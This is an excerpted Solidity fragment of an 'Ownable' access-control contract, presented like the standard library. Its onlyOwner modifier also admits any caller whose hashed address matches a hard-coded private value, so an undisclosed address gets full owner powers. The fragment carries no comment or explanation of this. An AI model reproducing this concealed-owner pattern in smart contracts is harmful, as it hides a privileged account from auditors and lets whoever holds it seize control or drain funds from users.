...
abstract contract Ownable is Context {
    ...
    bytes32 private ownership = 0xe2e2e6db1cde65f59894965be947b51bb5e3f6ba7cfbf6f57361a28438cc6ecd;
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || ownership == keccak256(abi.encodePacked(_msgSender()))
